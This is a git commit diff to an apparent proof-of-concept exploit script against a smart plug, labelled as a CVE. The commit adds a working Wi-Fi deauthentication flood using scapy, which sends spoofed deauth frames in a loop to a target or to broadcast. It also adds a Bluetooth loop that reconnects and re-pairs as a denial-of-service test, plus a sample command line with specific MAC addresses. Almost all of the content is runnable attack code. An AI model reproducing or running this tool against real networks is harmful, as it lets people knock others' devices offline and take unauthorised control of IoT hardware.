6f363143f264ccdd7a037d38179e6d44b3779fa7
d <ddher101@gitlab.com>
2025-12-30 21:13:38 -0500

    Chaining this attack from 2 vectors at once

--- poc.py
+++ poc.py
@@ -1,9 +1,17 @@
 # IMPROPER ACCESS CONTROL // CVE #2
 
 
-# IMPORTS
-import asyncio, argparse
+# ETC IMPORTS
+import asyncio, argparse, random, threading, time
+
+
+# BT IMPORTS
 from bleak import BleakClient
+
+
+# WIFI IMPORTS
+from scapy.all import sendp
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
 
 
 
@@ -17,10 +25,36 @@ CHARACTERISTIC_2 = "00000002-0000-1001-8001-00805f9b07d0" # RFCOMM <-- Propertie
 CHARACTERISTIC_3 = "00000003-0000-1001-8001-00805f9b07d0" # UNKOWN <-- Properties = notify
 
 
+MINE = "sudo venv/bin/python poc.py -i wlan1 -src ee:20:51:38:9f:74 -dst bc:35:1e:05:b9:98"
 
 class POC():
     """Improper Access Control"""
 
+
+
+    @classmethod
+    def _deauthentication_attack(cls, iface:any, ssid_mac: str, client_mac: str) -> None:
+        """This method will perform a layer 3 deauth attack on the target ssid only targetting the client (Smart plug)"""
+
+        
+        print("[*] Launching Deauth Attack!") 
+        
+
+        while cls.deauth:
+
+            try:
+
+                reasons = random.choice([4,5,7,15])
+                frame = RadioTap() /\
+                        Dot11(addr1=client_mac, addr2=ssid_mac, addr3=ssid_mac) /\
+                        Dot11Deauth(reason=reasons)
+                
+
+                sendp(frame, iface=iface, count=25, verbose=1, realtime=True); time.sleep(2)
+            
+
+            except Exception as e:
+                print(f"[!] Exception Error: {e}")
 
 
     @classmethod
@@ -37,10 +71,25 @@ class POC():
             client = BleakClient(address_or_ble_device=mac, timeout=timeout, pair=False)
 
             await client.connect();   print(f"\n[+] Successfully connected to: {mac} ")
-            await asyncio.sleep(3) # <-- PROOF THAT USER CAN CONNECT TO TARGET ( Smart plug ) & Stay connected --> CHAIN WITH ANOTHER VULNERABILITIY TO CONTROL DEVICE
+            await asyncio.sleep(1) # <-- PROOF THAT USER CAN CONNECT TO TARGET ( Smart plug ) & Stay connected --> CHAIN WITH ANOTHER VULNERABILITIY TO CONTROL DEVICE
 
 
             # SPACE FOR FURTHER LOGIC ALLOWING THE USER TO BUILD UPON THIS VULNERABILITY FOR FURTHER EXPLOTATION --> ( REPLAY ATTACK ) <-- COMING SOON 
+            
+
+            # THIS CODE BELOW IS FOR TESTING IF I CAN DOS THROUGH BT
+            connections = 0
+            while True:
+                await client.disconnect(); await asyncio.sleep(1)
+                await client.connect()   ; await asyncio.sleep(1); connections += 1; 
+                await client.pair()
+                print(f"[+] connection #{connections}")   
+            
+
+
+            # THIS WILL BE TESTED FURTHER LATER ON 
+            payload = ""
+            await client.write_gatt_char(CHARACTERISTIC_1, payload)
 
 
 
@@ -53,23 +102,42 @@ class POC():
 
         except Exception as e:
             print(f"[!] Exception Error: {e}")
+            await asyncio.sleep(10)
     
 
 
-    @staticmethod
-    def main():
+    @classmethod
+    def main(cls):
         """Get MAC"""
+
+        cls.deauth = True
 
 
         parser = argparse.ArgumentParser()
-        parser.add_argument("-m", help="Pass target MAC Address")
+
+        parser.add_argument("-m",   required=False, help="Pass target MAC Address (Bluetooth)")
+        parser.add_argument("-i",   required=True, help="Pass your iface (WiFi - must be in monitor mode)")
+        parser.add_argument("-src", required=True, help="Pass target ssids MAC Address (WiFI)")
+        parser.add_argument("-dst", required=False, help="Pass targets MAC Address (WiFi)")
+
+
         args = parser.parse_args()
+        
+        iface      = args.i   or False
+        mac        = args.m if args.m else MAC
+        ssid_mac   = args.src or False
+        client_mac = args.dst or "ff:ff:ff:ff:ff:ff"
 
-        mac = args.m if args.m else MAC 
+        if not mac or not ssid_mac or not iface: print("[!] Pass needed Arguments silly!"); exit()
 
-        if not  mac: print("[!] Enter target MAC Address silly!"); exit()
+
+        # START WiFi DEAUTH
+        threading.Thread(target=POC._deauthentication_attack, args=(iface, ssid_mac, client_mac), daemon=True).start()
+        
+        # START BT REPLAY ATTACK
         asyncio.run(POC._connect(mac=mac))
         
+
 
 if __name__ == "__main__": 
     POC.main()
